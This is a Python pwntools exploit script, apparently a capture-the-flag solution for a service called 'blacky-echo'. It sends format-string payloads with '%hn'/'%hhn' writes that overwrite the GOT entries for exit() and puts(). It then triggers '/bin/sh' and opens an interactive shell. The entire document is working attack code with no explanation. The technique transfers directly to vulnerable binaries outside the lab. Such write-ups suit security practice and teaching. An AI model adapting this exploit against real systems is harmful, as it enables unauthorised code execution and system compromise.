from pwn import *

r = remote("blacky-echo.challs.olicyber.it", 11002)
# r = process("./blacky_echo")

size = (1<<16) + 0x3f
written = len("[!] Error: Format err")

# ---- 1 ----
r.sendlineafter(b"Size: ", str(size).encode())

payload  = p64(0x602088) # exit()
payload += b"a" * (size-53-8)
payload += f"%{3237-written}c%31$hn".encode()

r.sendlineafter(b"Input: ", payload)

# ---- 2 ----
r.sendlineafter(b"Size: ", str(size).encode())

payload  = p64(0x602020) # puts()
payload += b"a" * (size-53-8)
payload += f"%{0x46-written}c%31$hhn".encode()

r.sendlineafter(b"Input: ", payload)

# ---- /bin/sh ----
r.sendlineafter(b"Size: ", b"15")
r.sendlineafter(b"Input: ", b"ECHO->/bin/sh")

r.interactive()